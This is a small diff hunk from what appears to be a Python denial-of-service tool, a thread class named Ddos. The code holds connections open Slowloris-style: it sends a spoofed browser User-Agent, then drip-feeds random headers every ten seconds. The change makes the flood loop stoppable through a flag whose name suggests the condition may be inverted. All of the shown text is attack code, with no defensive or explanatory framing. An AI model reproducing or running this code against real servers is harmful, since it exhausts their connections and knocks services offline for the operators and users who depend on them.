@@ -68,7 +68,7 @@ class Ddos(Thread):
                 ua = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36"
                 s.send(f"User-Agent:{ua}".encode("utf-8"))
                 s.send(f"Accept-language:en-US,en,q=0.5".encode("utf-8"))
-                while True:
+                while self.stop_threads:
                     try:
                         time.sleep(10)
                         s.send(f"X-a:{random.randint(1, 5000)}".encode("utf-8"))
